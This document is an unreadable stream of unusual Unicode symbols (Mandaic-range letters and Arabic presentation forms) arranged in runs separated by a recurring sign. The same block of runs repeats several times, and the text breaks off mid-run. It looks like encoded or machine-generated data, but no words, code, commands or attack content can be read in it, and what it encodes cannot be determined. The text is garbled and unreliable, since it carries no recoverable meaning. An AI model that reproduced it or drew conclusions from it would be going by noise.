࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙